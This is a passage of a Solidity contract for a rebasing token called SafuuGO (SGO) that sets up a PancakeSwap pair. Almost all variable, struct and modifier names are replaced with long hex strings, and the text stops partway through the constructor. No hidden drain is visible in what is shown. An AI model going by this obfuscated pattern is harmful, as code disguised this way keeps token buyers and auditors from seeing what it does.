contract SafuuGO is ERC20Detailed, RBAC {string public _name = "SGO";string public _symbol = "SGO";uint8 public _decimals = 18;IPancakeSwapPair public Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0;mapping(address => bool) Ox309fa20f8837684aa40a99f1f1ddce45692a17baaafb03d060b5814508f616be474e99cee425b1437d592bea7e575ddd6dd2019e78cfa13ee3e3ea3c0332f68a;modifier Oxa4e5f0de01ab4c631b4937495f4a7b258440801816f7b12ca38fb7f5103f0743a1ec47d6c5e28d7e56ca2f4454750d9798f6e7085f69cfd651026265aae69d9a(address to) {require(to != address(0x0));_;}uint256 public constant Ox9a1cb37be0d6053b595c5309556dcc5e2124f03236bcf2d6236fa56a3ab3d71c564dd87ae0698734e987121e313e901229411f48eda47eb6669397755bef7c81 = 40000000;uint256 public constant Oxfd5be9f07f7aa6fa50845dc6e3d05f71ec5fbefef3a40e29de3b3c3aaac835b590b36c51a9551734e876cc66b677cf2f81d02faeba526477282b784911475427 = 18;uint256 public constant Ox3de4b9065fab46dccef27b517d8a5a1c62e0763654f27349f208514a529db9854c508f23ad6cd45a6b6d726cf56d4fc0362bdccff2016b4d220f12b315726b22 = ~uint256(0);uint256 private constant Ox4489d92f8e7db42afedd238d1aaedcda37e6d03b1d650e0e14d576971392c64ca3d79fb2094f7b7e08bbf3b24c6e5f576d344e34d9a96ba74ada48b2217cd319 = 10**7;uint256 private constant Ox28dc8c3dc7344e7c922fbc4abc35d15577dd229aeff7de95cd740092883c8de1766bbd07c594efe5e9a33ac6b3b67dc35d5d8f4397bd23dd4725a44934e8b330 =50 * 10**3 * 10**Oxfd5be9f07f7aa6fa50845dc6e3d05f71ec5fbefef3a40e29de3b3c3aaac835b590b36c51a9551734e876cc66b677cf2f81d02faeba526477282b784911475427;uint256 public Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 = 9;uint256 public Oxb2c6616edd01f082ec7e4257d0c1fc301ce1135b3887cef21bbfae05497a58d846dffe712bf62adc0d5dec9cb16d94c6ec9efeb1bb84305349a0e9511b039245 = 5;uint256 public Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b = 1;uint256 public Ox506767f56feeccc025988ca739ee8e43d125967cc0a101b8c05915f9a8898284d1e05d018b1131f58f4f2f12ca25d11ef97bec3aeccc0ce0f816859f7764698d = Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 + Oxb2c6616edd01f082ec7e4257d0c1fc301ce1135b3887cef21bbfae05497a58d846dffe712bf62adc0d5dec9cb16d94c6ec9efeb1bb84305349a0e9511b039245 +  Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b;uint256 public Oxb300636ad81e8a744dd639272cbe74a1269cdd91d0789749758c5ccab4e8ba67409e3da1cbcb9586215bfa74c8ff8eb7ecc5b597cb870780a6eb8d5725d0e2c4 = 1000;address Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819 = 0x000000000000000000000000000000000000dEaD;address Oxef55ae916f742ac9bae1ed72794c843579775b6fc9c0a19a27c2d7b097cd2b55a5cee1c9259379581d22fb5c2e36899c1f8697a17a711998c2149183dcdc9728 = 0x0000000000000000000000000000000000000000;address public Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556;address public pairAddress;IPancakeSwapRouter public Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb;address public pair;bool Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28 = false;modifier Ox4432caf269bd3c89f73a2fbc47262008d2967720cf095c9facf4dc5d007880ad06c34565decd01bb93e4eb93ea816c530468d6c807a092aba6a25965a7905e14() {Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28 = true;_;Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28 = false;}uint256 private Ox958316d51963e8a542fc010a6427ae86d8a14ab83d60a4a2c0dc3ef052070311f88ab31684827aac898b500a838a100b55fe89ee429099d93f06c6e4b8f16d50 =Ox3de4b9065fab46dccef27b517d8a5a1c62e0763654f27349f208514a529db9854c508f23ad6cd45a6b6d726cf56d4fc0362bdccff2016b4d220f12b315726b22 - (Ox3de4b9065fab46dccef27b517d8a5a1c62e0763654f27349f208514a529db9854c508f23ad6cd45a6b6d726cf56d4fc0362bdccff2016b4d220f12b315726b22 % Ox28dc8c3dc7344e7c922fbc4abc35d15577dd229aeff7de95cd740092883c8de1766bbd07c594efe5e9a33ac6b3b67dc35d5d8f4397bd23dd4725a44934e8b330);uint256 private constant Oxcdd4850dad9352d0bf57085707dccf1743ff1e87267653051deb3c27200569273f6e06b6ea09fe848a00e97cdb5770c4cf0fcfa886a7f024cfb8b7bbaf1eeb8a = 50 * 10**7 * 10**Oxfd5be9f07f7aa6fa50845dc6e3d05f71ec5fbefef3a40e29de3b3c3aaac835b590b36c51a9551734e876cc66b677cf2f81d02faeba526477282b784911475427;uint256 private constant Oxce30e8c09a977ca68129619235dcdce6a2d476f6c6369fd7c6a818a91f35cd8f823d4093a9daf8226ed908c2a4654142876a50549570b77da604f53253e8132b = 50 * 10**2 * 10**Oxfd5be9f07f7aa6fa50845dc6e3d05f71ec5fbefef3a40e29de3b3c3aaac835b590b36c51a9551734e876cc66b677cf2f81d02faeba526477282b784911475427;bool public Ox29194b0725c83e6c356facae79255d0a5d86ce160f89c7ceada0af0559f33a1a14518bd73b40c1694a9a3fcb301af4c864335624595b15644369a1316041b36d;uint256 public Ox5be8ad281e015a2540bac067bffc0fac9bd290783aec2cbc9006196a47d82339f291b0d7134813441a3bf2e69f9385e64eb15801b94fc9acac863d65d082fee0;uint256 public Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5;uint256 public Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c;uint256 private Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;bool public Ox0c8d6de5ea1e5aa05d7c247bded0351923f1ea87f987037d60a8be779d10220db90ad2e41ffd8d7896eb45a66699379b52bbe6406cd0f3feb72822fac2173eaa;struct Ox3754cc2d4a076bea06755e74fb8af2539f91547f66aaa798547593ccef4e987aa7fc156138438aeeb19c9172b26659bd621a0cba1665bcf3f1d4a9d0953bbd11 {address Oxdc8d3b28c9808221e789abc6e7334b428b187a86b7c30b8537ea96dabddb2a7c054ccb14c21c8942ab4253bd9c90b32cf362e5859f39ebbdb3db10bb301702d3;address Ox14af6dd52de554194bf88e6dc7dde6b75f2ac5a616a3afe807f2a27542801d617ab0f5a2bc89c76de62f9246f4ccbab5d93bd3f110f75c11ad3ce7ec8818f6b8;address[] Ox0a621344e484d4068ab690ca2040a7738502f4c4b8668bf772c58adbbd3ad8a118e5ee1a0800d659d7717dab33177c1b106ac8ca1201a136f22922ba2805efa4;uint256[] Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357;uint256 Ox3cffbd991db34db73c8ce31c54545e2780649fa1065b514cdabe089c9afd283539aace8df22bf07f820d5a1234e86ff9f2809a789ea37b52b260bab3f9628b9e;bool Oxd742d77c12f812e8ec674d45cc850fea400c72ddf403788d2c6bcbed12494d2e4b9c26fe97cf82106e441de1f75543ed0bc6fba9d4fb6e5a701227c8559b1bf1;uint256 Ox733860415c880515084223ed9eb6687a832161188cd3dc81a6fa7806c94c6c6dd907e48434efcbf7edc25de991208631a0a9a759c869e98d899690cec5ffe4fb;uint8 Oxcb596cd72fb9955a60ca9e4b0bd52dc2a8a5469c6e33124ed502af5ce0c637180d3802f34c7be3d6155854b2e4d46557dac228a7629e53dfd38e87bcab619ef7;uint256 Ox3d1cd33121ce047fe4e2a855f65c89f97bc448c1d889187369ed49bd21372fa9e97d20c665ba71f2d41d6d26868cb26d20553088349de129520da8d1020dc289;uint256 Ox9d36153e52001dc3612238ff2616f960ecd284475e6909d8df851ea75c0ea398495e9bf6a484425bc4bbc006b9056a310e9c81be0ac9142903746b41ab5eb515;uint256 Oxca8ed0779f6d1b8223cd78ca07b17d88ea4a64154e7d8972d88d06be7d057c84b8ddb6718f120e06a989b5b47471303120bf565a878741db4422aa5a4441a8b6;bool Oxcfa597d19eeeedbc038e6ec805f5ee1d1ced2bb18f6126601d704322e77ba2879635756fad9058d356861c1e08c1ba6d3bc739223681e00cfac2364aea3ad5a5;address Ox32e1c660a02473df7f52cb1262d12589e2c7fe1d445861f18bfdd3a289e8d63362b193b350f1576a7422f3333be527867cce31d03ef779875eab10644861a770;uint256 Ox39b80d6ac8f3a94f307a60af1060182483dfe1f2e7773668434caf84fcbfb1f9ab4ef696c8a012f6b3bd463b07179020650136aefc2592ff299fecde0ba2b294;}struct pool {uint256 Oxce6925572c4cc8fb5be6c8d24f6b4223933ce97b6242c2b8f82c707e700293059580f8f221afe84b1f4cc43731007b98bfe8f1f63fd7a15bac6768e44cdaee51;uint256 Ox19911ce19b2a68750e96c6bbe6d7466cc7089c55737895b3a6f7503f73a6fac6bf16c1d7cc2ecc73d9c533d1beda9b080a17b0a4c6efd2bbf89b594cf90a584d;uint256 Ox469ca1feae59b04a92204cde0e18d5f43e360deacc81a78b7e806823c837897a2c93f147a7ec075abf0ed4f04fa514da3f1a0c7a0d29bfdb80f45426bb4e133b;uint256 Ox498143c462b89bfd2609990103448fc665bedd3241b988e00df864129126a45cfc1eed7463958a3ff1ebac1f7aa2040cd65634072c4bcc69c7cb911c82bb5ca6;uint256 Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02;uint256 Ox7ee2a18e0838bdbf657fb075ea5bf752b8f2add16921ff1fa1711c8ace024cc83c707b76f3b984a2c80ee400379a6c82868786cf12994743d61f4a68aa72bf95;uint256 Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24;IPancakeSwapPair Ox685f8edeac7c4a625d1e7969fb6c939eb7fe8dbab21c868063ce1d8501e78a0b0518cb0f95bdf025bd9edbfe56058ad9dcd0de7b61055df11b7e407ca3d5543c;uint256 Oxc7571bf378f58d4699f9f2639e6aceb00a9eb072db96c737144c0d292a5ed1e88109b951b8b33f691cdcada8b3c2d53dd1c0dfb5027654c7721834ebb66ce67a;uint256 Ox72888c6e782c8e2d1bf1e0c2a50808e5a1b2ff3ed7eac2d76ef57b77600f79f30e3c0bee582ef05fdaabe4d7385c58580618052f08dea0fed01459c78556f1f0;address Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150;address Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3;uint256 Ox1fa33859f33fa9e155cc41ef401fb63c9bc335e254b5eeed4ada1d03128f9867d21973a42cbaae2acbbb51541b4f46b5160f2567bf1b02135cce76d58e5231da;uint256 Ox9b8eb55defbcb1608bc4f0e8674f8cdaab800824252596a6cecaebab5938b98a6ddab9c1cc6bf1998ab8e6266a5f58caa9e691eff25a4ff2066260a0c2f86c01;address pairAddress;IPancakeSwapPair Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0;}uint256 private Ox6c221ae35b524ffb96d1358d9ff7d5257d03fe0e9e805f777b51259abf6cd1ee1a13338fe694b5281451412bba399a231599bffa83fa282983084b32af5d282c = 7;Ox3754cc2d4a076bea06755e74fb8af2539f91547f66aaa798547593ccef4e987aa7fc156138438aeeb19c9172b26659bd621a0cba1665bcf3f1d4a9d0953bbd11 public Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e;uint8 public Ox4e3352412d6de6b04877dec3370fd47d659c6a1b63e11ca873502fa72e93899c35f3b090f97a27713ef7940b2bf2d8dd06f7f8f85f21a07506e5c8677588a080;uint8 private Ox0d2f46af01ae354896b23f970da173772e5497f7fb3827067da2086edec03a0ccc99c83064d7b1c11e017071cf7b57b7233e3fdaf85ec03d3e95f703404ee602 = 2;uint256 public Ox95ab1a645be7533aa710ad76bcd8f637dec596054fda6ebb653340171d5aa2f18ef787383bbce2f5d4de344c0897c02671c48cea638381b074e76dc1bc940b71;uint256 public Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655;uint256 public Oxa39f66c194343dfc48b7bb7bfef0105126065bbd00a107de7d53ccee15f0ad04d1010dc88a5180e36b8a77579e208faa2081b906f497c7e42b686674b90ca91b;bool private Ox84625e80fe814b854335ebe0811d6e97aa209e3f8dd6589f12c1aced375a5cd598b14f21f9012ee200f850bf5bb3cf1131bd064fdf386d3c57a5b517c9a6d410;uint256 private Ox6738ade165074474f2ead6e545e588ee748131ca5701ffdbae3d34c0e88369c9b8cad7c5a05e024442abbf8791382e9153fbb84d17bd71a72d404b981578f80c;bool public Oxb39c69daa3f1158ba3153919f7ad2ef855672a9d98e61d7be50b3b382e17eb5dacc98257b885a35b82ae73283116c1010adde4e74fa73dcd678c4f556ae35a3d;address[] Oxf46fdc9d21c9e3f2d2480a834dc21ee0536e5431c62d3e1c0975c8cd6e731a42b58aa8062c82ed01cbfc4587e862643b38340b107437f996fd7f8e08d80ff56b;uint256 private Ox0d2236f9159e1bfcad010d743093446544bd914dd460be1eedfae47de407091f42877a66f7a8d2a6bf1e2fbbff554988e48dbbc32d3c6bb5768e95fd76b9c32a;address private Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;uint256 private Oxfe014cf0bb6538c63e80acf759b89d0827d801a7f25530632f3591edf863e03b9f089c37fd36952151ba4b797c9263bd06cb379f5e2f89065882b7d7190cccff;uint256 private Oxfd3352e517111b483889d7a73f91ddc63bf9801be4b97b8fae8c5a5948e15492dae9f6f7798a9f7f265f791d7413f58b165d77cbf72c931b7febb6b9266affd1 = 1;uint256 private Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88 = 20000;uint256 private Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835;bool private Ox4546b19be301da5b190ad3d48eb66286926dcf8759e5b67f5d15e4d4e661c90d0bbec58ccd6f2d24b844b3c0503b43edd9d5cbdccf04a6c038cb62d84d6cbb8a;uint256 private Oxa7bbff86979e0b6a116f18fb90a83136e3b5baad0856f1d7aa9651e44b5fd6aff5877607328573a6e7bb8271f5e7867993a038bf079b74e7fa725ae391f50df0 = block.timestamp;mapping(address => pool) private Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c;mapping(uint => address) public poolList;mapping(uint => uint256) public Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357;mapping(address => uint256) private Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2;mapping(uint256 => uint256) public Ox619e8ca4ce2cf8d47c48789372987edfb9cf7b5837a9ac4a0fe796113a4dd5701b13156f72def4a02c11e0864171eaf05982ce2b83b96aeb8a69cc16b61bb04e;mapping(address => uint256) private Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec;mapping(address => mapping(address => uint256)) private Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994;mapping(address => bool) public Ox3f5f94bc562cee134170bbd97c0b4849c3670bce368d3c02ebe0ac9aa7a7b1861c2e05ef1acd6856785c183c41c23a0d3ed28ca8f28cc443f8fa863fe02c70e5;mapping(address => uint256) private Ox7d8320f8a24ed1ba028759ecb5657cc8080eba0466f1714748e12069aeb50f2638b8b29924116ab4cb30e5614e9fad4f4d517dfa7aa92378265539a912d86670;mapping(address => uint256) private Oxbac15993a27da50d7cf05d535a9c57e1a074a653dd899d12b1dcb9eb8ccfcbc0ab1278e909ee74994c13a1e67bf48efa4e9d2173d421f0015c4f0004e8db0c3a;event LogRebase(uint256 indexed Ox067103e2198309e9276baed6051aff082aaeca9b82ee22af51c264d0085fe57b1c6432ed061e7031501f58d28301bc408c3d23f73300cde5f592bcf05fab3bc3, uint256 totalSupply, uint256 Ox4391b5728bda31ecd8276e10c3b69fac7903de046845da62df601c34d450a3b4e0af0f96022aacddb67e5f5eb2eb407a826bb60f4e784b06a28a6b18ab954204, uint256 Ox85b89461ead3538db7d309bcf7d86fe284ca691a19f685a41d63e06e65cdfa236f33a7efdbdff4ba33236594cc35e7ee051f863e66c0e0556d479b9075970fdd);event Oxae758b51292102eaf9576a600a01f185a6b7898ac54e2c3f7856d2bdbb3007278649b15c3183a11ad63a140066f932bc9495ee0556cba77619841dc0bad434e1(string message);event Ox947d4639c2cd6724b04315b9a96805ba1603a6a725670a4d9a1ee8200412dbae970256eff6ca667307eea90a228b419f7fa8a8403fd49281aa0157275097bc54(uint256 amount, uint8 podId, address recipient);event Ox284f3167879e00bc7988a523a5781ac7df8cae3708ddfc89970e5c67380022954154ce862d5b0c799b0199aaf09baa2cf2a59552406b81fbb48e4d2ac9110d9b(uint256 Ox31695c593ab3617431d843f63abb28bba22fa063bb6b68db0b860fb32bff52326e599e37d76f6d3458ee6e3cdcea9dab834b2dbd6ed582d56eaadf8d349367de, uint256 totalSupply, uint256 Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787, uint256 Ox5fa84fa7a499e73f1fce17c48b26fbeadfe94d1c8c73437307e23ad6b12f285cb7f4affbcc9b663b60b765c0ac73a43df82445db4f5fdba5fbf6653874da4ad3, uint256 sgoTOx30ac86e6cf2feabcf31914c26c72ecfb027e87cdf9118a747299d943171e57354fd6a49813af09aa482ca33fde00dcd52f9e206601c397a820abe4c65a80be81, uint256 Ox9d36153e52001dc3612238ff2616f960ecd284475e6909d8df851ea75c0ea398495e9bf6a484425bc4bbc006b9056a310e9c81be0ac9142903746b41ab5eb515, address Ox6f2aa5c88a31e66067f4ffa99d03c38d7e20d47960896e43060909b100061cc9752ccd1234e40442f8cb80c3e94d7ae47b86478a251281e2018463ce3e1013f1, uint256 Ox80019c3fe8aa3028afd0345e2b0aab857f9f4ff376b2a28426e85ef3c1908b5c8eec1f81b7e8ea284761d4777d9384ca2a8f181eedd425891221f2a39089d415);
constructor(address _Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc,Ox3754cc2d4a076bea06755e74fb8af2539f91547f66aaa798547593ccef4e987aa7fc156138438aeeb19c9172b26659bd621a0cba1665bcf3f1d4a9d0953bbd11 memory Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c, pool[] memory _Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c) 


ERC20Detailed("SGO", "SGO", uint8(Oxfd5be9f07f7aa6fa50845dc6e3d05f71ec5fbefef3a40e29de3b3c3aaac835b590b36c51a9551734e876cc66b677cf2f81d02faeba526477282b784911475427)) RBAC(msg.sender) {Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc = _Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc;Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb = IPancakeSwapRouter(Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Oxdc8d3b28c9808221e789abc6e7334b428b187a86b7c30b8537ea96dabddb2a7c054ccb14c21c8942ab4253bd9c90b32cf362e5859f39ebbdb3db10bb301702d3);pair = IPancakeSwapFactory(Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.factory()).createPair(Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.WETH(),address(this));Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556 = Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Ox14af6dd52de554194bf88e6dc7dde6b75f2ac5a616a3afe807f2a27542801d617ab0f5a2bc89c76de62f9246f4ccbab5d93bd3f110f75c11ad3ce7ec8818f6b8;Ox11ebaf4bece410a3fe1d9084976d6e9b4be6d01b88478fbecd89d885cecc81fc703c03d27caf4caa3ad9220420569118b69eebb84b593afd1abf674e99e1b994[address(this)][address(Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb)] = type(uint).max;pairAddress = pair;Oxf1c9f443e2204d36184a898405024370822695a0c30eb9e7e9e9ca9ed056049781cec83f110db2708e2719707bb0b8f746b9d2548f8f9a3f39bc912676a017e0 = IPancakeSwapPair(pair);Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c = Ox28dc8c3dc7344e7c922fbc4abc35d15577dd229aeff7de95cd740092883c8de1766bbd07c594efe5e9a33ac6b3b67dc35d5d8f4397bd23dd4725a44934e8b330;Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556] = Ox958316d51963e8a542fc010a6427ae86d8a14ab83d60a4a2c0dc3ef052070311f88ab31684827aac898b500a838a100b55fe89ee429099d93f06c6e4b8f16d50;Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7 = Ox958316d51963e8a542fc010a6427ae86d8a14ab83d60a4a2c0dc3ef052070311f88ab31684827aac898b500a838a100b55fe89ee429099d93f06c6e4b8f16d50 / Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c;Ox5be8ad281e015a2540bac067bffc0fac9bd290783aec2cbc9006196a47d82339f291b0d7134813441a3bf2e69f9385e64eb15801b94fc9acac863d65d082fee0 = block.timestamp;Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5 = block.timestamp;Ox309fa20f8837684aa40a99f1f1ddce45692a17baaafb03d060b5814508f616be474e99cee425b1437d592bea7e575ddd6dd2019e78cfa13ee3e3ea3c0332f68a[Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556] = true;Ox309fa20f8837684aa40a99f1f1ddce45692a17baaafb03d060b5814508f616be474e99cee425b1437d592bea7e575ddd6dd2019e78cfa13ee3e3ea3c0332f68a[address(this)] = true;Oxf46fdc9d21c9e3f2d2480a834dc21ee0536e5431c62d3e1c0975c8cd6e731a42b58aa8062c82ed01cbfc4587e862643b38340b107437f996fd7f8e08d80ff56b = new address[](2);Oxf46fdc9d21c9e3f2d2480a834dc21ee0536e5431c62d3e1c0975c8cd6e731a42b58aa8062c82ed01cbfc4587e862643b38340b107437f996fd7f8e08d80ff56b[0] = Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.WETH();Oxf46fdc9d21c9e3f2d2480a834dc21ee0536e5431c62d3e1c0975c8cd6e731a42b58aa8062c82ed01cbfc4587e862643b38340b107437f996fd7f8e08d80ff56b[1] = address(this);if(Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357.length>0) {Ox4e3352412d6de6b04877dec3370fd47d659c6a1b63e11ca873502fa72e93899c35f3b090f97a27713ef7940b2bf2d8dd06f7f8f85f21a07506e5c8677588a080 = uint8(Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357.length);for(uint8 i;i < Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357.length; i++) {Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357[i] = Ox1438a821db7525441f7c25862bd351b7118dfb011e77808064fac14c4dfac8114e77e29805e3ace28ad204827e419f8fd1ce1705183630d439ea4195fe2cbc7c.Ox8c87c98139451d3a564826ce334d979b724561bcbf2f87d807c8e92b839dcfe2083964391d1197e01e91f9b4ebc3e7a6b9f99989a52bd72c4aa79588ba516357[i];}}Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e = 